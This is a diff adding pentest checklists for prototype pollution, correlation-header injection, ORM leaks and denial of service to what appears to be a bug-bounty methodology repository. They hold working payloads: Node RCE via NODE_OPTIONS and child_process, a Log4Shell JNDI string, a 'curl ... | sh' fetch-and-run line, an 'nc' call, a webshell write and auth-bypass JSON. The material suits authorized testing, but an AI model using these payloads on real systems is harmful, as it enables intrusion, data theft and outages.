@@ -3037,3 +3037,1456 @@ Bug : Blind SQL Injection Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep
 ```
 
 </details>
+
+<details>
+
+<summary>Prototype Pollution</summary>
+
+> Run these boxes against any JS app that merges/clones user-controlled objects (JSON bodies, query strings, web messages). Core idea: inject `__proto__` / `constructor.prototype` keys so a property lands on `Object.prototype` and is inherited by **every** object → behavior change, DOM XSS, or RCE. Decide client-side (CSPP) vs server-side (SSPP) early — impact and detection differ. Order: find source → confirm pollution → find sink/gadget → exploit (XSS / RCE / logic) → tooling → impact.
+
+***
+
+### 0. Find Sources (where you inject)
+
+* [ ] **JSON body** merged/cloned server-side (`_.merge`, `$.extend(true,...)`, `Object.assign` misuse, custom recursive merge)
+* [ ] **URL query/hash** parsed into an object: `?__proto__[x]=y`, `#__proto__[x]=y`
+* [ ] **Web messages** (`postMessage`) feeding a merge/parse
+* [ ] Config/options objects built from user input
+* [ ] `path`-style setters (`obj[a][b]=value` where you control `a` and `value`) — Mpath/lodash-style
+* [ ] Look for libraries with known PP (lodash, jQuery `$.extend` deep, flat, Mpath, set-value, merge)
+
+***
+
+### 1. Confirm Pollution — Client-Side (CSPP)
+
+* [ ] Hash source: `https://victim/#__proto__[ppcheck]=reserved` then in console check `({}).ppcheck`
+* [ ] Query source: `?__proto__[ppcheck]=reserved`
+* [ ] `constructor` variant: `?constructor[prototype][ppcheck]=reserved`
+* [ ] Dotted variant: `?__proto__.ppcheck=reserved`
+* [ ] Use **Burp DOM Invader** (Prototype-pollution tab) — auto-mutates `__proto__`/`constructor.prototype`, flags polluted props at sinks
+* [ ] Confirm `Object.prototype.ppcheck` is set globally in DevTools
+
+***
+
+### 2. Confirm Pollution — Server-Side (SSPP)
+
+> Blackbox SSPP must avoid DoS — use safe, reversible property probes.
+
+* [ ] JSON: `{"__proto__":{"ppcheck":"x"}}` then look for reflected/behavioral change
+* [ ] `constructor` form: `{"constructor":{"prototype":{"ppcheck":"x"}}}`
+* [ ] **Express reflective probe:** `{"__proto__":{"parameterLimit":1}}` + 2 GET params, ≥1 reflected → only 1 reflected = polluted
+* [ ] **JSON-spaces gadget:** pollute `{"__proto__":{"json spaces":10}}` → response JSON gains indentation (visible, non-DoS)
+* [ ] **Status / header gadgets:** `{"__proto__":{"status":510}}`, `{"__proto__":{"content-type":"application/json; charset=utf-7"}}`
+* [ ] Detection-without-DoS technique (Gareth Heyes) — reversible probes over status/charset/space
+* [ ] Use Burp **server-side-prototype-pollution** / **SSPP-Gadgets-Scanner** extensions
+
+***
+
+### 3. Payload Forms to Try
+
+* [ ] `__proto__[prop]=value` (bracket, query)
+* [ ] `__proto__.prop=value` (dotted)
+* [ ] `{"__proto__":{"prop":"value"}}` (JSON)
+* [ ] `{"constructor":{"prototype":{"prop":"value"}}}` (when `__proto__` is filtered)
+* [ ] Nested for non-Object targets: `__proto__.__proto__.prop=value`
+* [ ] Array index pollution (pollute used-but-unwritten indexes)
+
+***
+
+### 4. Find the Sink / Gadget
+
+* [ ] Search source for keywords: `srcdoc`, `innerHTML`, `iframe`, `createElement`, `eval`, `setTimeout(str)`, `location`, `decodeURIComponent`
+* [ ] Identify a property read **without** `hasOwnProperty`/default guard: `config.x || defaults.x`
+* [ ] Trace which library stack first introduces pollution (root cause = earliest stack on a library file)
+* [ ] Use existing gadget collections: BlackFan/client-side-prototype-pollution, yuske/server-side-prototype-pollution
+* [ ] Build a gadget from source with pp-finder when none known
+
+***
+
+### 5. Exploit — Client-Side XSS via Gadgets
+
+* [ ] URL/href gadget: pollute `href` → `new URL('#')` sink → `javascript:` exec
+  * `?__proto__[href]=javascript:alert(document.domain)`
+* [ ] `src`+`onerror` gadget: `?__proto__[src]=image&__proto__[onerror]=alert(1)`
+* [ ] `constructor[prototype]` form: `?a[constructor][prototype][onerror]=alert(1)&a[constructor][prototype][src]=x`
+* [ ] jQuery delegateTarget gadget: `?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=<img/src/onerror=alert(1)>`
+* [ ] Sanitizer bypass: pollute `* ONERROR` / `* SRC` (Closure), or `Node.prototype.after` (DOMPurify ≤3.0.8, CVE-2024-45801)
+* [ ] Gadgets feeding `srcdoc`/`innerHTML`/`iframe` → DOM XSS
+* [ ] Check PortSwigger XSS cheat-sheet PP gadget list (11 confirmed browser gadgets)
+
+***
+
+### 6. Exploit — Server-Side RCE (Node)
+
+> PP that reaches a `child_process` spawn/fork can become RCE via env/option gadgets.
+
+*   [ ] **NODE\_OPTIONS + /proc/self/environ:**
+
+    ```json
+    {"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"console.log(require('child_process').execSync('id').toString())//"}}}
+    ```
+* [ ] `constructor.prototype` variant of the same env/NODE\_OPTIONS gadget
+* [ ] **argv0 + /proc/self/cmdline** variant (when environ not usable)
+*   [ ] **`--import data:` (read-only/locked-down envs, PortSwigger 2023):**
+
+    ```json
+    {"__proto__":{"NODE_OPTIONS":"--import data:text/javascript;base64,<b64 of require('child_process').execSync(...)>"}}
+    ```
+* [ ] Needs a spawn trigger (`fork`/`spawn`/`execSync`) somewhere after pollution
+* [ ] **exec-argument / shell gadget:** pollute `shell`, `env`, or `escapeFunction` (e.g. `{"__proto__":{"escapeFunction":"...require('child_process').exec('id|nc ...')"}}`)
+* [ ] **Kibana CVE-2019-7609** pattern: `.es().props(label.__proto__.env.AAAA='require("child_process").exec(...)')` + `NODE_OPTIONS=--require /proc/self/environ`
+
+***
+
+### 7. Exploit — Template-Engine AST Injection (SSTI via PP)
+
+*   [ ] **Pug:** pollute `block`/AST node → RCE
+
+    ```json
+    {"__proto__.block":{"type":"Text","line":"process.mainModule.require('child_process').execSync('id')"}}
+    ```
+* [ ] **Handlebars:** AST prototype pollution → code exec
+* [ ] Any engine compiling user-influenced AST/options objects
+
+***
+
+### 8. Exploit — Logic / Auth Bypass
+
+* [ ] Pollute auth flags: `{"__proto__":{"isAdmin":true}}`, `role`, `verified`, `isLoggedIn`
+* [ ] Only works where app reads the prop **without** explicitly setting/defaulting it
+* [ ] Pollute feature flags / limits to unlock functionality
+* [ ] DoS: pollute a property that breaks core logic (last resort, careful on prod)
+
+***
+
+### 9. Tooling
+
+* [ ] **Burp DOM Invader** (CSPP, v2023.6+ PP tab)
+* [ ] **ppmap**, **ppfuzz**, **PPScan**, **proto-find** (client-side scanners)
+* [ ] **portswigger/server-side-prototype-pollution** + **SSPP-Gadgets-Scanner** (Burp, SSPP)
+* [ ] **pp-finder** (build gadgets from source), BlackFan / yuske gadget repos
+* [ ] DevTools breakpoint method: set PP payload (`constructor[prototype][ppmap]=reserved`), break on first JS line, trace the sink
+
+***
+
+### 10. Confirm Impact
+
+* [ ] DOM XSS (client-side gadget → script execution)
+* [ ] RCE (server-side → `child_process` via NODE\_OPTIONS/env/import)
+* [ ] SSTI/AST → RCE (Pug/Handlebars)
+* [ ] Auth bypass / privilege escalation (`isAdmin` etc.)
+* [ ] Sanitizer bypass → stored XSS
+* [ ] DoS
+* [ ] Re-verify on a clean session; document source (JSON/query/hash), `__proto__` vs `constructor`, the sink/gadget, and CSPP vs SSPP
+
+```
+```
+
+</details>
+
+<details>
+
+<summary>X-Correlation Injection</summary>
+
+> Run these boxes against correlation/tracing headers (`X-Request-ID`, `X-Correlation-ID`, `X-Trace-ID`, `Request-ID`, `service-transaction-id`…). These are **user-supplied, usually unvalidated**, and flow into many server-side contexts the front-end never sanitizes for: local filesystems, CI pipelines, internal logging/monitoring, backend JSON blobs, terminals. The whole thing is **secondary-context / multi-context injection** — you don't know which context you'll land in, so fuzz to discover it. Frans Rosén's framing: "25 characters → a shell on a large company." Order: identify headers → confirm reflection/validation → error-fuzz → blind/OOB fuzz → per-context payloads → JSON injection deep-dive → optimize blind RCE → impact.
+
+***
+
+### 0. Identify Candidate Headers
+
+* [ ] Inspect **response headers** for any `-id` / `id` header the app emits
+* [ ] Check `Access-Control-*` (esp. `Access-Control-Allow-Headers`) for ID-style headers the API accepts
+* [ ] Grep your Burp/Caido proxy project for `-id` headers seen anywhere in traffic
+* [ ] Common names: `X-Request-ID`, `X-Correlation-ID`, `X-Trace-ID`, `X-Transaction-ID`, `Request-ID`, `Correlation-ID`, `service-transaction-id`, `X-Amzn-Trace-Id`
+* [ ] No format standard — assume any `*-id` header is fair game
+
+***
+
+### 1. Confirm Reflection & Rule Out False Positives
+
+* [ ] Add `X-Request-ID: test123` → is it echoed in a response header/body? (high-signal lead)
+* [ ] **Regex validation?** Many enforce `^[a-f0-9-]{36}$` (UUID) — anything outside errors out. Keep payloads UUID-shaped where needed
+* [ ] **Endpoint restriction?** The header may be rejected entirely on some endpoints
+* [ ] Play with the header to confirm it's actually _allowed_ before going deep (avoid rabbit holes)
+
+***
+
+### 2. Error-Based Fuzzing (discover the context)
+
+* [ ] Inject a spread of special chars: `' " % & > [ $` (each breaks _some_ context)
+* [ ] With those chars in the header, exercise the app normally and watch for:
+  * [ ] 500s / stack traces on specific endpoints
+  * [ ] odd behaviors, broken responses, changed routing
+* [ ] Narrow down which char triggers which behavior → that reveals the context
+* [ ] Test `"` vs `\"` to learn if you're inside a JSON string (see §6)
+
+***
+
+### 3. Blind / OOB Fuzzing (no reflection)
+
+> Need an out-of-band oracle since you often can't see the result.
+
+* [ ] **Blind XSS** payload (lands in an internal logging/monitoring dashboard)
+* [ ] **OOB RCE** — `$(curl yourdomain)` style → watch Collaborator/interactsh
+* [ ] **SQLi via DNS** (out-of-band SQL)
+* [ ] **Log4Shell** — still alive on internal services (see §4)
+* [ ] Monitor your OOB server for any hit (DNS or HTTP)
+* [ ] Generate **unique IDs per payload** so you can trace which injection/endpoint fired
+
+***
+
+### 4. Per-Context Payloads
+
+*   [ ] **Path traversal / arbitrary file write** — if the ID is written to disk (e.g. `/tmp/trace-data/<id>`):
+
+    ```
+    x-request-id: ../../../../var/www/html/<?=phpinfo()?>.php
+    ```
+*   [ ] **Header injection (secondary context)** — inject a header on the _backend_ request:
+
+    ```
+    x-request-id: 1%0d%0ax-account:456
+    ```
+*   [ ] **Java CRLF (`\u010d`/`\u010a` → `\r`/`\n`)** — Java sometimes folds these to newlines:
+
+    ```
+    x-request-id: 1%c4%8d%c4%8anew-header: f00
+    ```
+
+    (Soroush Dalili's char-conversion trick; use r12a.github.io/app-conversion to find variants)
+*   [ ] **OS command injection** — sometimes passed straight to a shell:
+
+    ```
+    x-request-id: $(id)
+    ```
+*   [ ] **Log4Shell:**
+
+    ```
+    x-request-id: ${jndi:rmi://x${sys:java.version}.yourdomain/a}
+    ```
+
+    (the `${sys:java.version}` exfils the JRE version in the DNS lookup)
+*   [ ] **JSON injection** (ID is part of a larger backend JSON blob):
+
+    ```
+    x-request-id: 1"}. "payload":{"account":"456","foo":"
+    ```
+
+***
+
+### 5. Optimize Blind / OOB RCE Payloads
+
+> Payload must survive _multiple unknown contexts_, so minimize special chars and spaces.
+
+* [ ] **No spaces** — use `$IFS` (note: `${IFS}` is often WAF-blocked, bare `$IFS` frequently isn't)
+*   [ ] Support several quoting contexts at once — combine backtick + `$()` + quotes:
+
+    ```
+    '`curl$IFS@mydomain|sh`'$(curl$IFS@mydomain|sh)
+    ```
+* [ ] Unique per-payload identifier to track when/where it detonated
+* [ ] **Collection script** server-side: if UA is curl, return a bash one-liner grabbing `whoami`,`id`,`uname`,`env`,`/etc/passwd`
+* [ ] **Alerting** on detonation — Slack/Discord webhook or email
+* [ ] Keep the char-count low (the whole point: tiny payload, huge impact)
+
+***
+
+### 6. Server-Side JSON Injection (the underrated one)
+
+> When the ID lands inside a JSON document passed between services. Feels blind — you're mapping the structure by probing context.
+
+**Determine context:**
+
+* [ ] Does `"` error but `\"` not (or vice-versa)? → tells you string vs escaped context
+* [ ] Are extra properties accepted or rejected?
+* [ ] Do multiple injection points exist (can you shuffle/return to a level)?
+
+**Premature ending** (find how many braces to close):
+
+* [ ] `id: 1"}x}}` → Error
+* [ ] `id: 1"}}x}` → Error
+* [ ] `id: 1"}}}x` → OK (now you know the nesting depth)
+
+**Duplicate properties / multiple injection points** (last-one-wins overrides):
+
+* [ ] `payload 1: 1", "foo":{"foo":"`
+* [ ] `payload 2: "}, "id": "4567`
+* [ ] Result smuggles a second `"id":"4567"` into the blob
+
+**High-impact JSON-injection scenarios:**
+
+*   [ ] **JWT property injection** — inject into a JWT being built server-side → add `"scope":"admin"` / `"user":"victim"`:
+
+    ```
+    username = frans","scope":"admin
+    → {"...","user":"frans","scope":"admin"}   (duplicate scope, last wins)
+    ```
+* [ ] **S3 policy injection** — push the existing upload policy into an (ignored) `Conditions` statement → bypass upload restrictions
+* [ ] Override account/price/role fields in internal service calls
+* [ ] Build a **context-aware wordlist** from API docs, prior traffic, Wayback — and **preserve casing** of real property names
+
+***
+
+### 7. Tooling & Resources
+
+* [ ] Burp/Caido Repeater + Intruder (header fuzzing)
+* [ ] Collaborator / interactsh (OOB oracle)
+* [ ] r12a.github.io/app-conversion (Unicode → CRLF char conversions for the Java trick)
+* [ ] Custom OOB collection server + Slack/Discord alert webhook
+* [ ] Frans Rosén deck "X-Correlation Injections / How to break server-side contexts" + CTBB HackerNotes Ep.86
+
+***
+
+### 8. Confirm Impact
+
+* [ ] Arbitrary file write → webshell → RCE (path traversal)
+* [ ] OS command injection / OOB RCE → shell
+* [ ] Log4Shell → RCE on internal service
+* [ ] Header injection → backend account/parameter override (secondary context)
+* [ ] JSON injection → JWT privilege escalation, S3 policy bypass, internal-API manipulation
+* [ ] SQLi (DNS-confirmed) → data access
+* [ ] Re-verify with a unique tracking ID; document the header, the context discovered, the payload, and the OOB evidence
+
+</details>
+
+<details>
+
+<summary>ORM Injection / ORM Leak</summary>
+
+> Run these boxes against any app where user input flows into an ORM query object (Prisma, Sequelize, TypeORM, Django ORM, Beego, Entity Framework, Eloquent, Active Record/Ransack). Two distinct classes: **(1) Operator injection** — coerce a string field into an operator object (`{not:..}`, `__startswith`) to bypass auth / NoSQL-style; **(2) ORM Leak** — control `filter`/`where`/`include`/`select` to pivot through relationships and exfiltrate sensitive fields (passwords, reset tokens) the API never meant to expose. Neither is classic SQLi — no quotes needed, the ORM builds the parameterized query _for_ you, with attacker-chosen structure. Order: fingerprint → find injectable input → operator-injection auth bypass → ORM Leak field/relationship exposure → blind extraction → ReDoS oracle → raw-query SQLi → tooling → impact.
+
+***
+
+### 0. Fingerprint the ORM / Stack
+
+* [ ] Node/TS → **Prisma** (object operators `{not,contains,startsWith}`), **Sequelize** (Symbol operators, but middleware string→op mapping is the risk), **TypeORM**
+* [ ] Python/Django → **Django ORM** (double-underscore lookups `field__startswith`)
+* [ ] Go → **Beego**, **GORM**
+* [ ] .NET → **Entity Framework** / **OData** (navigation properties, dynamic LINQ)
+* [ ] PHP → **Eloquent**, Ruby → **Active Record / Ransack** (`q[...]` params)
+* [ ] Errors, cookie names, response shapes, and `X-Powered-By` give the stack away
+
+***
+
+### 1. Find Injectable Input (type-coercion vectors)
+
+> The bug is the app assuming your input is a **string** and passing it straight to the query. Find where you can make it an **object/array** instead.
+
+* [ ] **JSON body** (Express `express.json()`): `{"resetToken":"E"}` → `{"resetToken":{"not":"E"}}`
+* [ ] **URL-encoded body** (`extended:true` / qs): `resetToken[not]=E`
+* [ ] **Query string** (Express <5 / extended parsers): `?resetToken[contains]=argon2`
+* [ ] **JSON cookies** (cookie-parser): `Cookie: resetToken=j:{"startsWith":"0x"}`
+* [ ] **PHP array trick**: `param=foo` → `param[op]=foo`
+* [ ] Ransack: `?q[field_predicate]=...` params
+* [ ] Look for endpoints taking a `filter`/`where`/`query`/`q`/`order`/`include`/`select` param
+
+***
+
+### 2. Operator Injection — Authentication Bypass (Prisma/Sequelize-style)
+
+> Conceptually NoSQL-injection for SQL ORMs. Inject an operator where a string was expected.
+
+*   [ ] **Prisma `not`** (matches every token ≠ value → bypass reset/token check):
+
+    ```json
+    {"resetToken":{"not":"E"},"password":"newpass"}
+    ```
+*   [ ] **Prisma `contains`** (substring match; avoids clobbering the first user):
+
+    ```json
+    {"resetToken":{"contains":"a"}}
+    ```
+* [ ] `startsWith` / `endsWith` / `gt` / `lt` variants
+* [ ] URL-encoded form: `resetToken[not]=E&password=newpass`
+* [ ] **Sequelize** via string→operator middleware (`$ne`, `$like`) where the app maps user strings to operators
+* [ ] **Django** lookups: `{"username":"admin","password__startswith":"p"}`
+* [ ] Confirm: token/credential check bypassed → password reset / login as victim
+
+***
+
+### 3. ORM Leak — Field & Relationship Exposure
+
+> When the app lets you control the **full query options** (`req.body.filter`, `where`, `include`, `select`), pivot to sensitive fields.
+
+*   [ ] **Prisma `include` relation** (dump related user incl. password/resetToken):
+
+    ```json
+    {"filter":{"include":{"createdBy":true}}}
+    ```
+*   [ ] **Prisma nested `select`** (pull only the secret field):
+
+    ```json
+    {"filter":{"select":{"createdBy":{"select":{"password":true}}}}}
+    ```
+*   [ ] **Prisma `where` over a relation** (leak by filtering on the secret):
+
+    ```json
+    {"filter":{"where":{"createdBy":{"password":{"startsWith":"super"}}}}}
+    ```
+* [ ] **Django relational pivot** (double-underscore through FK/M2M):
+  * `created_by__user__password__startswith=p`
+  * many-to-many: `created_by__departments__employees__user__id` → then `...__username`
+* [ ] **Django filter bypass via relationship** — dump `is_secret=True` rows by looping back through a relation from a non-secret row (the join leaks the protected field)
+* [ ] **Django Group/Permission M2M** — pivot from one user to others sharing a group/permission (AbstractUser default M2M)
+* [ ] **Entity Framework / OData** navigation properties: `CreatedBy/Token`, `CreatedBy/User/Password`
+* [ ] **Beego** expression-parser tricks to bypass deny-lists (Harbor case)
+* [ ] **Ransack** (pre-4.0): `q[user_reset_password_token_start]=0` … brute-force the token char-by-char
+
+***
+
+### 4. Blind Extraction (boolean oracle + collation)
+
+> Presence/absence of results (or pagination metadata) = a 1-bit oracle. Binary-search each char.
+
+* [ ] Use `startsWith`/`__startswith`/`_start` with a growing prefix: `0` → `0x` → `0x9`…
+* [ ] Confirm the oracle: matching prefix returns a row, non-matching returns none
+* [ ] **Calibrate to the DB collation** (don't assume ASCII byte order):
+  * MSSQL `SQL_Latin1_General_CP1_CI_AS` puts punctuation before digits/letters
+  * SQLite `LIKE` is case-insensitive → use `__regex` to recover case-sensitive tokens
+* [ ] Script the alphabet loop against the oracle (binary-search per char)
+* [ ] Target high-value fields: `resetToken`, `password` hash, API keys, 2FA secrets
+
+***
+
+### 5. Error-Based via ReDoS (when no boolean oracle)
+
+> Django + MySQL: a `__regex` predicate that backtracks only on a match → timeout 500 becomes the oracle.
+
+* [ ] `{"created_by__user__password__regex":"^(?=^pbkdf1).*.*.*.*.*.*.*.*!!!!$"}` → returns normally
+* [ ] `{"created_by__user__password__regex":"^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}` → 500 timeout = prefix matched
+* [ ] Walk the value using the timeout/no-timeout difference as the bit
+* [ ] Also a DoS primitive in its own right (see DoS checklist)
+
+***
+
+### 6. Raw-Query SQLi (ORM escape hatches)
+
+> ORMs don't prevent SQLi when devs use the unsafe raw APIs with string interpolation.
+
+* [ ] Prisma `$queryRawUnsafe` / `$executeRawUnsafe` with interpolated input → classic SQLi
+* [ ] Sequelize `.query()` with no `replacements`/`bind` → raw SQL injection
+* [ ] Django `.raw()` / `.extra()` with string formatting
+* [ ] Entity Framework `FromSqlRaw` (vs safe `FromSqlInterpolated`)
+* [ ] Eloquent `DB::raw` / whereRaw with concatenation
+* [ ] GORM `Raw()`/`Where()` with string concat
+* [ ] If reachable → fall through to the SQL injection checklist
+
+***
+
+### 7. Tooling
+
+* [ ] **plormber** (`plormber prisma-contains` / time-based) — automated ORM-leak extraction
+* [ ] **elttam semgrep-rules** (Django/Prisma/Beego/Entity Framework dangerous-use detection)
+* [ ] Burp Intruder for operator/prefix brute-force (the blind oracle)
+* [ ] Custom Python extractor against the boolean/timeout oracle
+
+***
+
+### 8. Confirm Impact
+
+* [ ] Authentication bypass (operator injection on token/credential check)
+* [ ] Sensitive-field exfiltration (passwords, reset tokens, API keys via include/select/where)
+* [ ] Cross-user / cross-tenant data via relationship pivots (filter bypass)
+* [ ] Full blind read of secrets via boolean/ReDoS oracle
+* [ ] SQLi via raw-query escape hatch (→ RCE potential)
+* [ ] DoS via ReDoS regex predicate
+* [ ] Re-verify on a clean session; document the ORM, the injectable param, the class (operator-injection vs ORM Leak), and the field/relationship reached
+
+</details>
+
+<details>
+
+<summary>Denial of Service DoS</summary>
+
+> Run these boxes to find **availability** bugs — where a small, cheap input causes disproportionate work or lockout. Web DoS splits into: **client-side** (crash/hang the victim's browser), **application-level** (exhaust server CPU/memory/workers with crafted input — the high-value, single-request class), **protocol-level** (HTTP/1.1 & HTTP/2 connection abuse), and **logic** (lockout, wallet, storage). Prefer single-request, asymmetric-cost bugs over volumetric floods.
+
+> ⚠️ **Scope & safety:** DoS testing can take a target down for real users. Only test in-scope targets, confirm DoS is allowed by the program (many bug-bounty programs **forbid** active DoS), prove with a **time-delta / small PoC** rather than sustained load, and never run volumetric attacks against shared infra. A 2-second measured delay or a single 500 is enough to demonstrate — don't weaponize.
+
+***
+
+### 0. Recon — Where Asymmetric Cost Hides
+
+* [ ] Inputs reflected into **regex** validation (email, URL, username, search, filters)
+* [ ] Anything that **parses** complex formats (XML, JSON, YAML, CSV, archives, images, PDFs)
+* [ ] **Decompression** points (gzip upload, zip import, avatar/image resize)
+* [ ] Search / sort / pagination / report generation / export
+* [ ] GraphQL endpoints (depth, batching, aliases)
+* [ ] Anything reflected into a **cookie** or cached response
+* [ ] Client-side scripts reading URL/hash/postMessage into a heavy operation
+* [ ] Auth flows (login, password set, reset) — lockout & expensive-hash surfaces
+
+***
+
+### 1. Application-Level — ReDoS (catastrophic backtracking)
+
+> One crafted string → regex engine hangs at exponential/polynomial cost. Single request, full CPU.
+
+* [ ] Find user input that hits a server-side regex (validation, parsing, WAF rules)
+* [ ] Test "evil regex" trigger inputs and measure response time:
+  * [ ] `aaaaaaaaaaaaaaaaaaaaaaaa!` (classic — hits `(a+)+`, `(a|a)*`, `(a|aa)+`, `(.*a){x}` patterns)
+  * [ ] Long run of the repeated char + a non-matching terminator
+  * [ ] 20,000+ whitespace / non-breaking-space (`\xa0`) chars (Stack Overflow 2016, httplib2 CVE pattern)
+* [ ] **ReDoS injection:** if the app builds a regex _from_ your input (e.g. "is username in password?"), inject an evil regex as one field + explosive string as the other
+* [ ] Confirm with a timing delta (baseline vs payload); escalate char count to widen the gap
+* [ ] Tooling: regex101 (backtracking debugger), `redos-detector`, `recheck`, rxxr2 to spot vulnerable patterns in leaked JS/source
+
+***
+
+### 2. Application-Level — Decompression & Parser Bombs
+
+* [ ] **Zip bomb** (e.g. nested/overlapping zip) into any unzip/import feature → disk/memory exhaustion
+* [ ] **Gzip bomb** in a `Content-Encoding: gzip` body the server inflates
+* [ ] **XML Billion Laughs / quadratic blowup** (entity expansion — see XXE checklist)
+* [ ] **Pixel flood / image-decompression bomb** — tiny file, enormous decoded dimensions (e.g. a 64KB PNG decoding to gigapixels) into image resizers/thumbnailers
+* [ ] **YAML/JSON deep nesting** → parser stack/memory blowup
+* [ ] **CSV/spreadsheet** with millions of derived cells / formula expansion
+* [ ] Confirm memory/CPU spike or worker timeout (single upload)
+
+***
+
+### 3. Application-Level — Algorithmic / Resource Complexity
+
+* [ ] **Hash-flooding (HashDoS)** — many keys colliding in a hash map (POST body params, JSON keys) → O(n²) insertion
+* [ ] **JS number-parser DoS** (PortSwigger 2024) — parameter pollution / crafted numbers exploiting parser discrepancies
+* [ ] Expensive sort/search params (force worst-case ordering, huge `limit`/`page` values)
+* [ ] Unbounded loops / fan-out triggered by a field (e.g. quantity, range, recursion depth)
+* [ ] **Mass / batch** endpoints with no item cap
+* [ ] Wildcard-heavy `LIKE`/search → DB CPU burn (SQLi-wildcard-style)
+* [ ] Confirm one request consumes disproportionate server time
+
+***
+
+### 4. Application-Level — Expensive-Operation Abuse
+
+* [ ] **Long-password DoS** — submit a very long password where server uses slow KDF (bcrypt/PBKDF2/scrypt/argon2) without a length cap → CPU burn per login attempt (CVE-class: "bcrypt long password")
+* [ ] Expensive crypto / key-gen / PDF-render / OCR triggered by unauthenticated input
+* [ ] Email/SMS/webhook send loops (also → cost/"Denial of Wallet")
+* [ ] Server-side image/video transcoding with attacker-set dimensions/duration
+* [ ] Burp Intruder **denial-of-service mode** (fire request, close socket, don't wait) to test high-workload endpoints without holding local resources
+
+***
+
+### 5. The WAF / Cookie-Reflection DoS (your page)
+
+> Persistent, per-victim DoS via a poisoned cookie that the WAF later blocks.
+
+* [ ] Find: WAF with **default request-size inspection limit** (e.g. AWS WAF skips oversized requests), a parameter **reflected into `Set-Cookie`** via POST, and **no CSRF** on that endpoint
+* [ ] Craft a POST: large dummy param (exceeds WAF inspection size) + malicious payload (`' OR SLEEP(10);--`) in the reflected param
+* [ ] Server sets the malicious value in the victim's cookie (WAF doesn't inspect responses)
+* [ ] Victim's **future** requests carry the cookie → WAF blocks them → 403 / site inaccessible for cookie lifetime
+* [ ] Deliver via attacker-hosted page (fetch/form); combine with XSS for no-interaction delivery
+* [ ] Tooling: `nowafpls` (Burp ext — pad requests past WAF limits)
+
+***
+
+### 6. Cache-Poisoning DoS (CPDoS — poison once, deny everyone)
+
+> Get an unusable response (empty/error/wrong-content-type/oversized-header) cached under a normal key so the CDN serves it to **all** users. Highest-impact DoS class — one request, site-wide outage. Confirm caching first; scope your PoC to `/test` or use `Accept-Encoding: none` if it's in the cache key so you only poison your own variant.
+
+**Generic CPDoS (header-based, RFC-style):**
+
+* [ ] **HHO (HTTP Header Oversize)** — send an oversized header the origin rejects with a cacheable error → cached for all
+* [ ] **HMC (HTTP Meta Character)** — header with a meta char (`\n`, `\r`, etc.) → origin errors → cached
+* [ ] **HMO (HTTP Method Override)** — `X-HTTP-Method-Override: POST`/`DELETE` etc. on a GET → cached error/empty
+* [ ] Poison via an unkeyed header (the value isn't part of the cache key but breaks the origin)
+
+**Framework-specific (Next.js / Nuxt) — see the Next.js testing checklist for full detail:**
+
+* [ ] **Next.js middleware-prefetch** (`x-middleware-prefetch: 1`) → cached empty `{}`
+* [ ] **Next.js RSC** (`Rsc: 1`, no `_rsc` buster) → cached RSC binary on the HTML route (CDNs ignore `Vary: Rsc`)
+* [ ] **Next.js `x-invoke-status: 200` / `x-invoke-error`** → cache the error page with a 200 status
+* [ ] **Next.js `__nextDataReq=1` + `x-now-route-matches: 1`** (and `/_next/data/{buildId}/x.json`) → cached JSON on the page route
+* [ ] **Nuxt** (`?poc=/_payload.json` or `#/_payload.json`, CVE-2025-27415) → cached JSON payload on main route
+* [ ] Verify persistence: re-request the clean URL without your header → broken response served = poisoned
+
+***
+
+### 7. Client-Side DoS (crash/hang the victim's browser)
+
+> Source (URL/hash/`postMessage`/stored data) → client script does something unbounded.
+
+* [ ] **DOM-based DoS** (PortSwigger: reflected / stored / DOM) — controllable value flows into a script that loops, allocates, or builds huge DOM
+* [ ] **Client-side ReDoS** — input hits a client-side regex → tab freeze
+* [ ] **Cookie bombing** — set many/huge cookies for the origin so requests exceed the server's max header size → app returns 400/431 for the victim until cookies cleared
+* [ ] **Hash/URL-driven allocation** — `#` value used in `repeat()`, huge array, or recursive render
+* [ ] **`window.postMessage` flood / heavy handler** → main-thread lock
+* [ ] **CSS/JS resource bombs** in user-controlled HTML (huge `background` loops, deep nesting)
+* [ ] Confirm tab hang/crash (test in your own browser only)
+
+***
+
+### 8. Protocol-Level (HTTP/1.1 & HTTP/2)
+
+* [ ] **Slowloris** — open many connections, send partial headers slowly, never finish → exhaust connection pool
+* [ ] **Slow POST (R-U-Dead-Yet)** — declare large `Content-Length`, send body 1 byte at a time
+* [ ] **HTTP/2 Rapid Reset (CVE-2023-44487)** — open stream then immediately RST\_STREAM, repeat → server does work, cancels cheaply
+* [ ] **HTTP/2 CONTINUATION Flood** — endless CONTINUATION frames with no `END_HEADERS` → memory/CPU exhaustion
+* [ ] **HPACK bomb** — compressed header expansion
+* [ ] Range-header amplification (`Range: bytes=0-,0-,...`) where supported
+* [ ] (Protocol DoS is often out of scope / volumetric — confirm allowance first)
+
+***
+
+### 9. Logic / Resource-Lockout DoS
+
+* [ ] **Account-lockout DoS** — deliberately fail a victim's logins to lock them out (where lockout-after-N is enforced)
+* [ ] **Email/identifier reservation lockout** — register/squat a victim's pending email/username
+* [ ] **Storage exhaustion** — fill the victim's quota (inbox, uploads, notes) to break functionality
+* [ ] **Denial of Wallet** — drive metered/serverless cost (Lambda invocations, egress, SMS) via cheap triggers
+* [ ] (Cache-poisoning DoS / CPDoS now has its own section — §6)
+* [ ] Confirm the victim (or all users) lose access / incur cost
+
+***
+
+### 10. Confirm Impact & Report
+
+* [ ] Single-request asymmetric cost (best): show the time-delta / 500 / memory spike
+* [ ] Per-victim persistent DoS (cookie/lockout): show the victim's 403/400 state
+* [ ] All-users DoS (cache/shared resource): show cross-user effect
+* [ ] Client-side: show tab crash/hang reproducibly
+* [ ] **Do not** sustain the attack — minimal PoC only; note cost amplification (input size → work) instead of running it at scale
+* [ ] Document the input, the expensive operation/context, the measured cost ratio, and the affected scope (single user / all users / browser)
+
+</details>
+
+<details>
+
+<summary>Proxy / WAF Protections Bypass</summary>
+
